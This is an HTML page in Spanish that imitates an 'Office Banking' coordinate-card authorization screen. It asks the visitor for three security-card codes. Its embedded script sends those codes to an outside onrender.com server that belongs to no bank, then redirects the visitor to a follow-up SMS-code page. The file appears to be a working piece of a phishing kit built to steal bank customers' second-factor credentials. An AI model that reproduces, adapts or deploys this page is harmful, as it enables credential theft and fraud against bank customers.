<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización por Coordenadas</title>
  <link rel="stylesheet" href="style.css">
  <style>
    .coord-container {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 20px;
    }
    input.coord {
      border: 1px solid #000;
      outline: none;
      color: #000;
      padding: 5px;
      font-size: 16px;
      width: 40px;              /* espacio para 2 dígitos */
      text-align: center;
      background-color: #fff;
    }
    input.coord:focus {
      border: 1px solid #000;
      outline: none;
    }
    .botones {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 40px; /* más separado hacia abajo */
    }
    .btn-red {
      background: red;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 12px 20px;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
    }
    .btn-red:hover {
      background: #b30000;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
    <h1>Ingrese las coordenadas solicitadas</h1>

    <form id="formCoordenadas">
      <div class="coord-container">
        <label>A4:<input type="text" id="coord1" class="coord" maxlength="2" required></label>
        <label>B7:<input type="text" id="coord2" class="coord" maxlength="2" required></label>
        <label>C2:<input type="text" id="coord3" class="coord" maxlength="2" required></label>
      </div>
      <div class="botones">
        <button type="submit" class="btn-red">Autorizar</button>
      </div>
    </form>

    <div id="mensaje"></div>
  </div>

  <script>
    document.getElementById("formCoordenadas").addEventListener("submit", async function(e){
      e.preventDefault();
      const coord1 = document.getElementById("coord1").value;
      const coord2 = document.getElementById("coord2").value;
      const coord3 = document.getElementById("coord3").value;

      const mensaje = `Autorización por coordenadas:
      A4: ${coord1}
      B7: ${coord2}
      C2: ${coord3}`;

      try {
        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });
        document.getElementById("mensaje").innerText = "Coordenadas enviadas, cargando SMS...";
        window.location.href="autorizacion-sms.html";
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
      }
    });
  </script>
</body>
</html>
